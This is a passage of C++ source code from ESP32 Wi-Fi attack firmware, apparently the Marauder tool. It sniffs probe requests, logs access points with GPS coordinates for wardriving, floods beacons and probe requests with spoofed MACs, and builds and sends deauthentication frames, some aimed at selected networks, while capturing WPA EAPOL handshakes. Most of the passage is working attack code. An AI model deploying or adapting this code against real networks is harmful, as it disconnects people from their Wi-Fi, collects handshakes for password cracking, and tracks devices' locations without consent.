  String display_string = "";

  if (type == WIFI_PKT_MGMT)
  {
    len -= 4;
    int fctl = ntohs(frameControl->fctl);
    const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
    const WifiMgmtHdr *hdr = &ipkt->hdr;


    // If we dont the buffer size is not 0, don't write or else we get CORRUPT_HEAP
    //#ifdef HAS_SCREEN
    //  int buf = display_obj.display_buffer->size();
    //#else
    int buf = 0;
    //#endif
    if ((snifferPacket->payload[0] == 0x40) && (buf == 0))
    {
      if (wifi_scan_obj.currentScanMode == WIFI_SCAN_PROBE) {
        delay(random(0, 10));
        Serial.print("RSSI: ");
        Serial.print(snifferPacket->rx_ctrl.rssi);
        Serial.print(" Ch: ");
        Serial.print(snifferPacket->rx_ctrl.channel);
        Serial.print(" Client: ");
        char addr[] = "00:00:00:00:00:00";
        getMAC(addr, snifferPacket->payload, 10);
        Serial.print(addr);
        display_string.concat(addr);
        Serial.print(" Requesting: ");
        display_string.concat(" -> ");
        for (int i = 0; i < snifferPacket->payload[25]; i++)
        {
          Serial.print((char)snifferPacket->payload[26 + i]);
          display_string.concat((char)snifferPacket->payload[26 + i]);
        }

        // Print spaces because of the rotating lines of the hardware scroll.
        // The same characters print from previous lines so I just overwrite them
        // with spaces.
        #ifdef HAS_SCREEN
          for (int i = 0; i < 19 - snifferPacket->payload[25]; i++)
          {
            display_string.concat(" ");
          }
    
          if (display_obj.display_buffer->size() == 0)
          {
            //while (display_obj.printing)
            //  delay(1);
            display_obj.loading = true;
            display_obj.display_buffer->add(display_string);
            display_obj.loading = false;
          }
        #endif
        
        Serial.println();    

        buffer_obj.append(snifferPacket, len);
      }
      else if (wifi_scan_obj.currentScanMode == WIFI_SCAN_STATION_WAR_DRIVE) {
        #ifdef HAS_GPS
          if (gps_obj.getGpsModuleStatus()) {
            bool do_save = false;  

            // Check if we've already seen this AP
            char addr[] = "00:00:00:00:00:00";
            getMAC(addr, snifferPacket->payload, 10);
            if (wifi_scan_obj.seen_mac(reinterpret_cast<unsigned char*>(addr)))
              return;

            Serial.print("RSSI: ");
            Serial.print(snifferPacket->rx_ctrl.rssi);
            Serial.print(" Ch: ");
            Serial.print(snifferPacket->rx_ctrl.channel);

            Serial.print(" BSSID: ");
            Serial.print(addr);
            display_string.concat(addr);

            if (gps_obj.getFixStatus()) {
              do_save = true;
              display_string.concat(" | Lt: " + gps_obj.getLat());
              display_string.concat(" | Ln: " + gps_obj.getLon());
            }
            else
              display_string.concat(" | GPS: No Fix");

            int temp_len = display_string.length();

            #ifdef HAS_SCREEN
              for (int i = 0; i < 40 - temp_len; i++)
              {
                display_string.concat(" ");
              }
        
              Serial.print(" ");
        
              if (display_obj.display_buffer->size() == 0)
              {
                display_obj.loading = true;
                display_obj.display_buffer->add(display_string);
                display_obj.loading = false;
              }
            #endif

            Serial.println();

            //wifi_scan_obj.save_mac(reinterpret_cast<unsigned char*>(addr));

            if (do_save) {
              String wardrive_line = (String)addr + "," + (String)addr + ",," + gps_obj.getDatetime() + "," + (String)snifferPacket->rx_ctrl.channel + "," + (String)snifferPacket->rx_ctrl.rssi + "," + gps_obj.getLat() + "," + gps_obj.getLon() + "," + gps_obj.getAlt() + "," + gps_obj.getAccuracy() + ",WIFI";
              Serial.println(wardrive_line);
              buffer_obj.append(wardrive_line);
            }
          }
        #endif
      }
    }
  }
}

void WiFiScan::beaconListSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
  WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
  wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)snifferPacket->rx_ctrl;
  int len = snifferPacket->rx_ctrl.sig_len;

  String display_string = "";
  String essid = "";
  bool found = false;

  if (type == WIFI_PKT_MGMT)
  {
    len -= 4;
    int fctl = ntohs(frameControl->fctl);
    const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
    const WifiMgmtHdr *hdr = &ipkt->hdr;


    // If we dont the buffer size is not 0, don't write or else we get CORRUPT_HEAP
    #ifdef HAS_SCREEN
      int buf = display_obj.display_buffer->size();
    #else
      int buf = 0;
    #endif
    if ((snifferPacket->payload[0] == 0x40) && (buf == 0))
    {

      for (uint8_t i = 0; i < snifferPacket->payload[25]; i++)
      {
        essid.concat((char)snifferPacket->payload[26 + i]);
      }

      for (int i = 0; i < ssids->size(); i++) {
        if (ssids->get(i).essid == essid) {
          Serial.println("Found a sheep");
          found = true;
          break;
        }
      }

      if (!found)
        return;
      
      delay(random(0, 10));
      Serial.print("RSSI: ");
      Serial.print(snifferPacket->rx_ctrl.rssi);
      Serial.print(" Ch: ");
      Serial.print(snifferPacket->rx_ctrl.channel);
      Serial.print(" Client: ");
      char addr[] = "00:00:00:00:00:00";
      getMAC(addr, snifferPacket->payload, 10);
      Serial.print(addr);
      display_string.concat(addr);
      Serial.print(" Requesting: ");
      display_string.concat(" -> ");

      // ESSID
      for (int i = 0; i < snifferPacket->payload[25]; i++)
      {
        Serial.print((char)snifferPacket->payload[26 + i]);
        display_string.concat((char)snifferPacket->payload[26 + i]);
      }

      // Print spaces because of the rotating lines of the hardware scroll.
      // The same characters print from previous lines so I just overwrite them
      // with spaces.
      #ifdef HAS_SCREEN
        for (int i = 0; i < 19 - snifferPacket->payload[25]; i++)
        {
          display_string.concat(" ");
        }
  
        if (display_obj.display_buffer->size() == 0)
        {
          display_obj.loading = true;
          display_obj.display_buffer->add(display_string);
          display_obj.loading = false;
        }
      #endif
      
      Serial.println();    

      buffer_obj.append(snifferPacket, len);
    }
  }
}

void WiFiScan::broadcastCustomBeacon(uint32_t current_time, AccessPoint custom_ssid) {
  set_channel = random(1,12); 
  esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
  delay(1);  

  if (custom_ssid.beacon->size() == 0)
    return;


  // Randomize SRC MAC
  // Randomize SRC MAC
  packet[10] = packet[16] = random(256);
  packet[11] = packet[17] = random(256);
  packet[12] = packet[18] = random(256);
  packet[13] = packet[19] = random(256);
  packet[14] = packet[20] = random(256);
  packet[15] = packet[21] = random(256);

  char ESSID[custom_ssid.essid.length() + 1] = {};
  custom_ssid.essid.toCharArray(ESSID, custom_ssid.essid.length() + 1);

  int realLen = strlen(ESSID);
  int ssidLen = random(realLen, 33);
  int numSpace = ssidLen - realLen;
  //int rand_len = sizeof(rand_reg);
  int fullLen = ssidLen;
  packet[37] = fullLen;

  // Insert my tag
  for(int i = 0; i < realLen; i++)
    packet[38 + i] = ESSID[i];

  for(int i = 0; i < numSpace; i++)
    packet[38 + realLen + i] = 0x20;

  /////////////////////////////
  
  packet[50 + fullLen] = set_channel;

  uint8_t postSSID[13] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, //supported rate
                      0x03, 0x01, 0x04 /*DSSS (Current Channel)*/ };



  // Add everything that goes after the SSID
  //for(int i = 0; i < 12; i++) 
  //  packet[38 + fullLen + i] = postSSID[i];

  packet[34] = custom_ssid.beacon->get(0);
  packet[35] = custom_ssid.beacon->get(1);
  

  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);

  packets_sent = packets_sent + 3;
}

void WiFiScan::broadcastCustomBeacon(uint32_t current_time, ssid custom_ssid) {
  set_channel = custom_ssid.channel;
  esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
  delay(1);  

  // Randomize SRC MAC
  packet[10] = packet[16] = custom_ssid.bssid[0];
  packet[11] = packet[17] = custom_ssid.bssid[1];
  packet[12] = packet[18] = custom_ssid.bssid[2];
  packet[13] = packet[19] = custom_ssid.bssid[3];
  packet[14] = packet[20] = custom_ssid.bssid[4];
  packet[15] = packet[21] = custom_ssid.bssid[5];

  char ESSID[custom_ssid.essid.length() + 1] = {};
  custom_ssid.essid.toCharArray(ESSID, custom_ssid.essid.length() + 1);

  int ssidLen = strlen(ESSID);
  //int rand_len = sizeof(rand_reg);
  int fullLen = ssidLen;
  packet[37] = fullLen;

  // Insert my tag
  for(int i = 0; i < ssidLen; i++)
    packet[38 + i] = ESSID[i];

  /////////////////////////////
  
  packet[50 + fullLen] = set_channel;

  uint8_t postSSID[13] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, //supported rate
                      0x03, 0x01, 0x04 /*DSSS (Current Channel)*/ };



  // Add everything that goes after the SSID
  for(int i = 0; i < 12; i++) 
    packet[38 + fullLen + i] = postSSID[i];
  

  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);

  packets_sent = packets_sent + 3;
}

// Function to send beacons with random ESSID length
void WiFiScan::broadcastSetSSID(uint32_t current_time, const char* ESSID) {
  set_channel = random(1,12); 
  esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
  delay(1);  

  // Randomize SRC MAC
  packet[10] = packet[16] = random(256);
  packet[11] = packet[17] = random(256);
  packet[12] = packet[18] = random(256);
  packet[13] = packet[19] = random(256);
  packet[14] = packet[20] = random(256);
  packet[15] = packet[21] = random(256);

  int ssidLen = strlen(ESSID);
  //int rand_len = sizeof(rand_reg);
  int fullLen = ssidLen;
  packet[37] = fullLen;

  // Insert my tag
  for(int i = 0; i < ssidLen; i++)
    packet[38 + i] = ESSID[i];

  /////////////////////////////
  
  packet[50 + fullLen] = set_channel;

  uint8_t postSSID[13] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, //supported rate
                      0x03, 0x01, 0x04 /*DSSS (Current Channel)*/ };



  // Add everything that goes after the SSID
  for(int i = 0; i < 12; i++) 
    packet[38 + fullLen + i] = postSSID[i];
  

  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);

  packets_sent = packets_sent + 3;
  
}

// Function for sending crafted beacon frames
void WiFiScan::broadcastRandomSSID(uint32_t currentTime) {

  set_channel = random(1,12); 
  esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
  delay(1);  

  // Randomize SRC MAC
  packet[10] = packet[16] = random(256);
  packet[11] = packet[17] = random(256);
  packet[12] = packet[18] = random(256);
  packet[13] = packet[19] = random(256);
  packet[14] = packet[20] = random(256);
  packet[15] = packet[21] = random(256);

  packet[37] = 6;
  
  
  // Randomize SSID (Fixed size 6. Lazy right?)
  packet[38] = alfa[random(65)];
  packet[39] = alfa[random(65)];
  packet[40] = alfa[random(65)];
  packet[41] = alfa[random(65)];
  packet[42] = alfa[random(65)];
  packet[43] = alfa[random(65)];
  
  packet[56] = set_channel;

  uint8_t postSSID[13] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, //supported rate
                      0x03, 0x01, 0x04 /*DSSS (Current Channel)*/ };



  // Add everything that goes after the SSID
  for(int i = 0; i < 12; i++) 
    packet[38 + 6 + i] = postSSID[i];

  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
  //ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false));
  //ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false));

  packets_sent = packets_sent + 3;
}

// Function to send probe flood to all "active" access points
void WiFiScan::sendProbeAttack(uint32_t currentTime) {
  // Itterate through all access points in list
  for (int i = 0; i < access_points->size(); i++) {

    // Check if active
    if (access_points->get(i).selected) {
      this->set_channel = access_points->get(i).channel;
      esp_wifi_set_channel(this->set_channel, WIFI_SECOND_CHAN_NONE);
      delay(1);
      
      // Build packet
      // Randomize SRC MAC
      
      prob_req_packet[10] = random(256);
      prob_req_packet[11] = random(256);
      prob_req_packet[12] = random(256);
      prob_req_packet[13] = random(256);
      prob_req_packet[14] = random(256);
      prob_req_packet[15] = random(256);

      // Set SSID length
      int ssidLen = access_points->get(i).essid.length();
      int fullLen = ssidLen;
      prob_req_packet[25] = fullLen;

      // Insert ESSID
      char buf[access_points->get(i).essid.length() + 1] = {};
      access_points->get(i).essid.toCharArray(buf, access_points->get(i).essid.length() + 1);
      
      for(int i = 0; i < ssidLen; i++)
        prob_req_packet[26 + i] = buf[i];

      uint8_t postSSID[40] = {0x00, 0x00, 0x01, 0x08, 0x8c, 0x12, 
                              0x18, 0x24, 0x30, 0x48, 0x60, 0x6c, 
                              0x2d, 0x1a, 0xad, 0x01, 0x17, 0xff, 
                              0xff, 0x00, 0x00, 0x7e, 0x00, 0x00, 
                              0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 
                              0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
                              0x00, 0x00, 0x00, 0x00};

      uint8_t good_probe_req_packet[26 + fullLen + 40] = {};
      
      for (int i = 0; i < 26 + fullLen; i++)
        good_probe_req_packet[i] = prob_req_packet[i];

      for(int i = 0; i < 40; i++) 
        good_probe_req_packet[26 + fullLen + i] = postSSID[i];

      

      // Send packet
      esp_wifi_80211_tx(WIFI_IF_AP, good_probe_req_packet, sizeof(good_probe_req_packet), false);
      esp_wifi_80211_tx(WIFI_IF_AP, good_probe_req_packet, sizeof(good_probe_req_packet), false);
      esp_wifi_80211_tx(WIFI_IF_AP, good_probe_req_packet, sizeof(good_probe_req_packet), false);

      packets_sent = packets_sent + 3;
    }
  }
}

void WiFiScan::sendDeauthFrame(uint8_t bssid[6], int channel, uint8_t mac[6]) {
  WiFiScan::set_channel = channel;
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  delay(1);
  
  // Build AP source packet
  deauth_frame_default[4] = mac[0];
  deauth_frame_default[5] = mac[1];
  deauth_frame_default[6] = mac[2];
  deauth_frame_default[7] = mac[3];
  deauth_frame_default[8] = mac[4];
  deauth_frame_default[9] = mac[5];
  
  deauth_frame_default[10] = bssid[0];
  deauth_frame_default[11] = bssid[1];
  deauth_frame_default[12] = bssid[2];
  deauth_frame_default[13] = bssid[3];
  deauth_frame_default[14] = bssid[4];
  deauth_frame_default[15] = bssid[5];

  deauth_frame_default[16] = bssid[0];
  deauth_frame_default[17] = bssid[1];
  deauth_frame_default[18] = bssid[2];
  deauth_frame_default[19] = bssid[3];
  deauth_frame_default[20] = bssid[4];
  deauth_frame_default[21] = bssid[5];      

  // Send packet
  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);

  packets_sent = packets_sent + 3;

  // Build AP dest packet
  deauth_frame_default[4] = bssid[0];
  deauth_frame_default[5] = bssid[1];
  deauth_frame_default[6] = bssid[2];
  deauth_frame_default[7] = bssid[3];
  deauth_frame_default[8] = bssid[4];
  deauth_frame_default[9] = bssid[5];
  
  deauth_frame_default[10] = mac[0];
  deauth_frame_default[11] = mac[1];
  deauth_frame_default[12] = mac[2];
  deauth_frame_default[13] = mac[3];
  deauth_frame_default[14] = mac[4];
  deauth_frame_default[15] = mac[5];

  deauth_frame_default[16] = mac[0];
  deauth_frame_default[17] = mac[1];
  deauth_frame_default[18] = mac[2];
  deauth_frame_default[19] = mac[3];
  deauth_frame_default[20] = mac[4];
  deauth_frame_default[21] = mac[5];      

  // Send packet
  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);

  packets_sent = packets_sent + 3;
}

void WiFiScan::sendDeauthFrame(uint8_t bssid[6], int channel, String dst_mac_str) {
  // Itterate through all access points in list
  // Check if active
  WiFiScan::set_channel = channel;
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  delay(1);
  
  // Build packet

  sscanf(dst_mac_str.c_str(), "%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx", 
        &deauth_frame_default[4], &deauth_frame_default[5], &deauth_frame_default[6], &deauth_frame_default[7], &deauth_frame_default[8], &deauth_frame_default[9]);
  
  deauth_frame_default[10] = bssid[0];
  deauth_frame_default[11] = bssid[1];
  deauth_frame_default[12] = bssid[2];
  deauth_frame_default[13] = bssid[3];
  deauth_frame_default[14] = bssid[4];
  deauth_frame_default[15] = bssid[5];

  deauth_frame_default[16] = bssid[0];
  deauth_frame_default[17] = bssid[1];
  deauth_frame_default[18] = bssid[2];
  deauth_frame_default[19] = bssid[3];
  deauth_frame_default[20] = bssid[4];
  deauth_frame_default[21] = bssid[5];      

  // Send packet
  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);

  packets_sent = packets_sent + 3;
}

void WiFiScan::sendDeauthAttack(uint32_t currentTime, String dst_mac_str) {
  // Itterate through all access points in list
  for (int i = 0; i < access_points->size(); i++) {

    // Check if active
    if (access_points->get(i).selected) {
      this->set_channel = access_points->get(i).channel;
      esp_wifi_set_channel(this->set_channel, WIFI_SECOND_CHAN_NONE);
      delay(1);
      
      // Build packet

      sscanf(dst_mac_str.c_str(), "%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx", 
            &deauth_frame_default[4], &deauth_frame_default[5], &deauth_frame_default[6], &deauth_frame_default[7], &deauth_frame_default[8], &deauth_frame_default[9]);
      
      deauth_frame_default[10] = access_points->get(i).bssid[0];
      deauth_frame_default[11] = access_points->get(i).bssid[1];
      deauth_frame_default[12] = access_points->get(i).bssid[2];
      deauth_frame_default[13] = access_points->get(i).bssid[3];
      deauth_frame_default[14] = access_points->get(i).bssid[4];
      deauth_frame_default[15] = access_points->get(i).bssid[5];

      deauth_frame_default[16] = access_points->get(i).bssid[0];
      deauth_frame_default[17] = access_points->get(i).bssid[1];
      deauth_frame_default[18] = access_points->get(i).bssid[2];
      deauth_frame_default[19] = access_points->get(i).bssid[3];
      deauth_frame_default[20] = access_points->get(i).bssid[4];
      deauth_frame_default[21] = access_points->get(i).bssid[5];      

      // Send packet
      esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
      esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
      esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);

      packets_sent = packets_sent + 3;
    }
  }
}


void WiFiScan::wifiSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
{
  wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
  WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
  wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)snifferPacket->rx_ctrl;
  int len = snifferPacket->rx_ctrl.sig_len;

  String display_string = "";

  #ifdef HAS_SCREEN
    int buff = display_obj.display_buffer->size();
  #else
    int buff = 0;
  #endif

  if (type == WIFI_PKT_MGMT)
  {
    len -= 4;
    int fctl = ntohs(frameControl->fctl);
    const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
    const WifiMgmtHdr *hdr = &ipkt->hdr;

    // If we dont the buffer size is not 0, don't write or else we get CORRUPT_HEAP
    #ifdef HAS_SCREEN
      #ifdef HAS_ILI9341
        if (snifferPacket->payload[0] == 0x80)
        {
          num_beacon++;
        }
        else if ((snifferPacket->payload[0] == 0xA0 || snifferPacket->payload[0] == 0xC0 ))
        {
          num_deauth++;
        }
        else if (snifferPacket->payload[0] == 0x40)
        {
          num_probe++;
        }
      #else
        if (snifferPacket->payload[0] == 0x80)
          display_string.concat(";grn;");
        else if ((snifferPacket->payload[0] == 0xA0 || snifferPacket->payload[0] == 0xC0 ))
          display_string.concat(";red;");
        else if (snifferPacket->payload[0] == 0x40)
          display_string.concat(";cyn;");
        else
          display_string.concat(";mgn;");
      #endif
    #endif
  }
  else {
    #ifdef HAS_SCREEN
      #ifndef HAS_ILI9341
        display_string.concat(";wht;");
      #endif
    #endif
  }

  char src_addr[] = "00:00:00:00:00:00";
  char dst_addr[] = "00:00:00:00:00:00";
  getMAC(src_addr, snifferPacket->payload, 10);
  getMAC(dst_addr, snifferPacket->payload, 4);
  display_string.concat(src_addr);
  display_string.concat(" -> ");
  display_string.concat(dst_addr);

  int temp_len = display_string.length();

  #ifdef HAS_SCREEN
    // Fill blank space
    for (int i = 0; i < 40 - temp_len; i++)
    {
      display_string.concat(" ");
    }
  
    //Serial.print(" ");
  
    #ifdef SCREEN_BUFFER
      //if (display_obj.display_buffer->size() == 0)
      //{
      //  display_obj.loading = true;
        //while(display_obj.display_buffer->size() >= 10)
        //  delay(10);
        if (display_obj.display_buffer->size() >= 10)
          return;

        display_obj.display_buffer->add(display_string);
      //  display_obj.loading = false;
        Serial.println(display_string);
      //}
    #endif
  #endif

  buffer_obj.append(snifferPacket, len);
  //}
}

void WiFiScan::eapolSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
{
  extern WiFiScan wifi_scan_obj;
  bool send_deauth = settings_obj.loadSetting<bool>(text_table4[5]);
  
  wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
  WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
  wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)snifferPacket->rx_ctrl;
  int len = snifferPacket->rx_ctrl.sig_len;

  String display_string = "";

  if (type == WIFI_PKT_MGMT)
  {
    len -= 4;
    int fctl = ntohs(frameControl->fctl);
    const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
    const WifiMgmtHdr *hdr = &ipkt->hdr;
  }

  #ifdef HAS_SCREEN
    int buff = display_obj.display_buffer->size();
  #else
    int buff = 0;
  #endif

  // Found beacon frame. Decide whether to deauth
  if (send_deauth) {
    if (snifferPacket->payload[0] == 0x80) {    
      // Build packet
      
      wifi_scan_obj.deauth_frame_default[10] = snifferPacket->payload[10];
      wifi_scan_obj.deauth_frame_default[11] = snifferPacket->payload[11];
      wifi_scan_obj.deauth_frame_default[12] = snifferPacket->payload[12];
      wifi_scan_obj.deauth_frame_default[13] = snifferPacket->payload[13];
      wifi_scan_obj.deauth_frame_default[14] = snifferPacket->payload[14];
      wifi_scan_obj.deauth_frame_default[15] = snifferPacket->payload[15];
    
      wifi_scan_obj.deauth_frame_default[16] = snifferPacket->payload[10];
      wifi_scan_obj.deauth_frame_default[17] = snifferPacket->payload[11];
      wifi_scan_obj.deauth_frame_default[18] = snifferPacket->payload[12];
      wifi_scan_obj.deauth_frame_default[19] = snifferPacket->payload[13];
      wifi_scan_obj.deauth_frame_default[20] = snifferPacket->payload[14];
      wifi_scan_obj.deauth_frame_default[21] = snifferPacket->payload[15];      
    
      // Send packet
      esp_wifi_80211_tx(WIFI_IF_AP, wifi_scan_obj.deauth_frame_default, sizeof(wifi_scan_obj.deauth_frame_default), false);
      delay(1);
    }


  }

  if (( (snifferPacket->payload[30] == 0x88 && snifferPacket->payload[31] == 0x8e)|| ( snifferPacket->payload[32] == 0x88 && snifferPacket->payload[33] == 0x8e) )){
    num_eapol++;
    Serial.println("Received EAPOL:");

    char addr[] = "00:00:00:00:00:00";
    getMAC(addr, snifferPacket->payload, 10);
    display_string.concat(addr);

    int temp_len = display_string.length();

   #ifdef HAS_SCREEN
      for (int i = 0; i < 40 - temp_len; i++)
      {
        display_string.concat(" ");
      }

      Serial.print(" ");

      #ifdef SCREEN_BUFFER
        if (display_obj.display_buffer->size() == 0)
        {
          display_obj.loading = true;
          display_obj.display_buffer->add(display_string);
          display_obj.loading = false;
        }
      #endif
    #else
      Serial.println(addr);    
    #endif
  }

  buffer_obj.append(snifferPacket, len);
}

void WiFiScan::activeEapolSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
{
  extern WiFiScan wifi_scan_obj;

  bool send_deauth = settings_obj.loadSetting<bool>(text_table4[5]);
  
  wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
  WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
  wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)snifferPacket->rx_ctrl;
  int len = snifferPacket->rx_ctrl.sig_len;

  if (type == WIFI_PKT_MGMT)
  {
    len -= 4;
    int fctl = ntohs(frameControl->fctl);
    const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
    const WifiMgmtHdr *hdr = &ipkt->hdr;
  }
  
  // Found beacon frame. Decide whether to deauth

  if (snifferPacket->payload[0] == 0x80) {   

    // Do target stuff
    if (wifi_scan_obj.currentScanMode == WIFI_SCAN_ACTIVE_LIST_EAPOL) {
      bool found = false;

      // Check list of APs
      for (int i = 0; i < access_points->size(); i++) {
        if (access_points->get(i).selected) {
          uint8_t addr[] = {snifferPacket->payload[10],
                            snifferPacket->payload[11],
                            snifferPacket->payload[12],
                            snifferPacket->payload[13],
                            snifferPacket->payload[14],
                            snifferPacket->payload[15]};
          // Compare AP bssid to ssid of recvd packet
          for (int x = 0; x < 6; x++) {
            if (addr[x] != access_points->get(i).bssid[x]) {
              found = false;
              break;
            }
            else
              found = true;
          }
          if (found) {
            Serial.println("Received beacon from " + access_points->get(i).essid + ". Deauthenticating...");
            break;
          }
        }
      }
      if (!found)
        return;      
    } // End targeted stuff 
    // Build packet
    
    wifi_scan_obj.deauth_frame_default[10] = snifferPacket->payload[10];
    wifi_scan_obj.deauth_frame_default[11] = snifferPacket->payload[11];
    wifi_scan_obj.deauth_frame_default[12] = snifferPacket->payload[12];
    wifi_scan_obj.deauth_frame_default[13] = snifferPacket->payload[13];
    wifi_scan_obj.deauth_frame_default[14] = snifferPacket->payload[14];
    wifi_scan_obj.deauth_frame_default[15] = snifferPacket->payload[15];
  
    wifi_scan_obj.deauth_frame_default[16] = snifferPacket->payload[10];
    wifi_scan_obj.deauth_frame_default[17] = snifferPacket->payload[11];
    wifi_scan_obj.deauth_frame_default[18] = snifferPacket->payload[12];
    wifi_scan_obj.deauth_frame_default[19] = snifferPacket->payload[13];
    wifi_scan_obj.deauth_frame_default[20] = snifferPacket->payload[14];
    wifi_scan_obj.deauth_frame_default[21] = snifferPacket->payload[15];      
  
    // Send packet
    esp_wifi_80211_tx(WIFI_IF_AP, wifi_scan_obj.deauth_frame_default, sizeof(wifi_scan_obj.deauth_frame_default), false);
    delay(1);
  }



  if (( (snifferPacket->payload[30] == 0x88 && snifferPacket->payload[31] == 0x8e)|| ( snifferPacket->payload[32] == 0x88 && snifferPacket->payload[33] == 0x8e) )){
    num_eapol++;
    Serial.println("Received EAPOL:");

  }

  buffer_obj.append(snifferPacket, len);
}

#ifdef HAS_SCREEN
  void WiFiScan::eapolMonitorMain(uint32_t currentTime)
  {
    //---------MAIN 'FOR' LOOP! THIS IS WHERE ALL THE ACTION HAPPENS! HAS TO BE FAST!!!!!---------\\
    
  
  //  for (x_pos = (11 + x_scale); x_pos <= 320; x_pos += x_scale) //go along every point on the x axis and do something, start over when finished
    for (x_pos = (11 + x_scale); x_pos <= 320; x_pos = x_pos)
    {
      currentTime = millis();
      do_break = false;
  
      y_pos_x = 0;
      y_pos_y = 0;
      y_pos_z = 0;
      boolean pressed = false;
  
      uint16_t t_x = 0, t_y = 0; // To store the touch coordinates
  
      // Do the touch stuff
      #ifdef HAS_ILI9341
        pressed = display_obj.tft.getTouch(&t_x, &t_y);
      #endif
  
      if (pressed) {
        Serial.print("Got touch | X: ");
        Serial.print(t_x);
        Serial.print(" Y: ");
        Serial.println(t_y);
      }
  
  
      // Check buttons for presses
      for (uint8_t b = 0; b < BUTTON_ARRAY_LEN; b++)
      {
        if (pressed && display_obj.key[b].contains(t_x, t_y))
        {
          display_obj.key[b].press(true);
        } else {
          display_obj.key[b].press(false);
        }
      }
  
      // Which buttons pressed
      for (uint8_t b = 0; b < BUTTON_ARRAY_LEN; b++)
      {
        if (display_obj.key[b].justPressed())
        {
          Serial.println("Bro, key pressed");
          //do_break = true;
        }
  
        if (display_obj.key[b].justReleased())
        {
          do_break = true;
  
          // Channel - button pressed
          if (b == 4) {
            if (set_channel > 1) {
              Serial.println("Shit channel down");
              set_channel--;
              delay(70);
              display_obj.tft.fillRect(127, 0, 193, 28, TFT_BLACK);
              display_obj.tftDrawChannelScaleButtons(set_channel);
              display_obj.tftDrawExitScaleButtons();
              changeChannel();
              break;
            }
          }
  
          // Channel + button pressed
          else if (b == 5) {
            if (set_channel < MAX_CHANNEL) {
              Serial.println("Shit channel up");
              set_channel++;
              delay(70);
              display_obj.tft.fillRect(127, 0, 193, 28, TFT_BLACK);
              display_obj.tftDrawChannelScaleButtons(set_channel);
              display_obj.tftDrawExitScaleButtons();
